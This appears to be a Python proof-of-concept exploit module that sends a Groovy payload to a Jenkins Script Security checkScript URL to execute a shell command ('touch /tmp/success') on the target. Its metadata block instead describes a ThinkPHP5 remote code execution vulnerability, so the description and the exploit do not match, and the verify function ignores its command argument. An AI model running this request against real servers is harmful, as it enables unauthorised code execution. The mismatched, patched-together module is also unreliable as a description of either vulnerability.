'''POC
http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public class x {
  public x(){
    "touch /tmp/success".execute()
  }
}
'''
import requests


def get_info():
    return {
        "name": "ThinkPHP5 5.0.*/5.1.* 远程代码执行漏洞",
        "impact_range": "ThinkPHP 5.0.5-5.0.22 and 5.1.0-5.1.30",
        "info": "ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞",
        "fixed_time": "2018-12-10",
    }


def verify(ip, port, cmd="uname"):
    requests.get(
        "http://" + ip + ":" + str(port) + "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){'touch /tmp/sucess'.execute()}}")



